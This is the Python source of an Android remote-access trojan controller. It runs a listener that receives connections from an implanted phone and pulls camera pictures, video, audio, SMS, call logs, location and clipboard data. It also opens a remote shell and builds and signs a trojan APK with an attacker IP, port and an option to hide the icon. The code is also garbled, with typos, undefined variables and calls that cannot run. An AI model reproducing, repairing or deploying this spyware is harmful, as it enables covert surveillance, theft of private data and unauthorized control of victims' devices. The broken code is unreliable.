import sys
import os 
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue

fy = """
   ##     ##  ##   ####     #####      ##     ######  
  ####    ### ##   ## ##    ##  ##    ####      ##    
 ##  ##   ######   ##  ##   ##  ##   ##  ##     ##    
 ######   ######   ##  ##   #####    ######     ##    
 ##  ##   ## ###   ##  ##   ####     ##  ##     ##    
 ##  ##   ##  ##   ## ##    ## ##    ##  ##     ##    
 ##  ##   ##  ##   ####     ##  ##   ##  ##     ##    
 by : Zarachii
 """

def stdOutput(type_=None):
    if type_ =="error":col="31m";str="ERROR"
    if type_ =="warning":col="32m";str="WARNING"
    if type_ =="sucesss":col="32m";str="SUCCESS"
    if type_ =="info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message

def animate(message):
    chars = "/-\\"
    for char in chars:
        sys.stdout.write("\r"+ stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system()== 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n:0 <= int(n)<=255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1 else 0
    return 1 

def execute(commamnd):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command, queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result

def getpwd(name):
    return os.getcwd()+direc+name;

def help():
    helper="""
      Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag = 0
    filename = "Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer = recvall(client)
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer == "":
        print(stdOutput("error")+"unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"successfully saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1 
            print(stdOutput("error")+ "Not able to decode the Image\n")
    
    if flag == 1:
        os.remove(filename)

def readSMS(clinet,data):
    print(stdOutput("info")+ "\033[0mGetting"+data+"SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps" +direc+data+"_"+timestr+'.txt'
    flag = 0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(clinet)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Successfull saved in \033[1m\033[32m"+getpwd(filename)+ "\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+ "Unable to decode the SMs\n")
    if flag == 1:
        os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag = 0 
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"successfully Downloaded in \033[1m\033[32m"+getpwd(filename)+ "\n")
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the audio file")
    
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename,"rb").read()
    encoded = base64.b64decode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(clinet)
        if "getFile" in msg:
            msg= " "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
        if "putFile" in msg:
            msg= ""
            sendingData=""
            filename = command.split("") [1].strip()
            file = pathlib.Path(filename)
            if file.exists:
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Successfully Uploaded the file \032[32m{filedata[0]+'.'+filedata[1]}in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")
        
        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        print("")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip()== "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)
        if("END123" in msg):
            return
        print("")

def recvall(sock):
    buff =""
    data =""
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            buff+= data
    return buff

def recvallShell(sock):
    buff = ""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(stdOutput("info")+ "\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data = ""
    flag =0
    data = data.strip().replace("END123","").strip()
    filename = "Dumps" + direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("Success")+ "Successfully saved in "+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+ "Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)

def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownnloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data = ""
    flag = 0
    data=recvall(client)
    data = data.strip().replace("END123", "").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4'
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("Success")+ "Successfully saved "+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+ "Not able to decode the video file")
    if flag == 1:
        os.remove(filename)

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime()
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_logs"+timestr+'.txt'
    if "No call logs" in msg:
        msg.split("\n")
        print(msg.replace("END123","").strip())
        print("")
    else:
        with open(filename,'w', errors="ignore", encoding="utf-8") as txt:
            txt.write(msg)
            txt.close()
            print(stdOutput("success")+ "successfully saved in \033[1m\033[32m"+getpwd(filename))
            if not os.path.getsize(filename):
                os.remove(filename)

def get_shell(ip,port):
    soc = socket.socket()
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error")+"\033[1m %S" %e);exit()

    soc.listen(2)
    print(fy)
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker, args=[soc,que])
        t.daemon = True
        t.start()
        while t.is_alive(): animate("connection establishing")
        t.join()
        conn, addr= que.get()
        clear()
        print("\033[1m\033[33mGot Connection from \033[31m"+"".join(str(addr))+"\033[0m")
        print("")
        while True:
            msg = conn.recv(4021).decode("UTF-8")
            if(msg.strip()=="IMAGE"):
                getImage(conn)
            elif("readSMS"in msg.split()):
                content = msg.split().split("")
                data = content[1]
                readSMS(conn,data)
            elif(msg.split()== "SHELL"):
                shell(conn)
            elif(msg.split()== "getLocation"):
                getLocation(conn)
            elif(msg.split()== "stopVideo12"):
                stopVideo(conn)
            elif(msg.split()== "stopAudio"):
                stopAudio(conn)
            elif(msg.splir()== "callLogs"):
                callLogs(conn)
            elif(msg.split()== "help"):
                help()
            else:
                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Rada msee" in msg else print(msg)
            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if (message_to_send.strip() == "Clear"): clear()


def connection_checker(socket, queue):
    conn, addr = socket.accept()
    queue.put([conn, addr])
    return conn, addr


def build(ip,port,output,ngrok=False, ng=None, icon=None):
    editor = "Complied Apk"+direc+"small"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.small"
    try:
        file = open(editor, "r").readlines()
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
    except Exception as e:
        print(e)
        sys.exit()
    java_version = execute("java - version")
    if java_version.returncode: print(stdOutput("error")+ "Java not installed"); exit()
    print(stdOutput("info")+"\033[0mGenerating Apk")
    outFilename = output if output else "karma.apk"
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk -o "+outFilename,que],)
    t.start()
    while t.is_alive(): animate("Building app")
    t.join()
    print("")
    resOut = que.get()
    if not resOut.returncode:
        print(stdOutput("success")+"successfull signed APk \033[1m\033[32m"+getpwd(outFilename)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning the apk")
        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing Apk")
        t.join()
        print("")
        resOut = que.get()
        if not resOut.returncode:
            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFilename+"\033[0m")
            if ngrok:
                clear()
                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
            print("")
        else:
            print('\r'+resOut.stderr)
            print(stdOutput("error")+ "signing failed")
    
    else:
       print('\r'+resOut.stderr)
    print(stdOutput("error")+"Building Failed")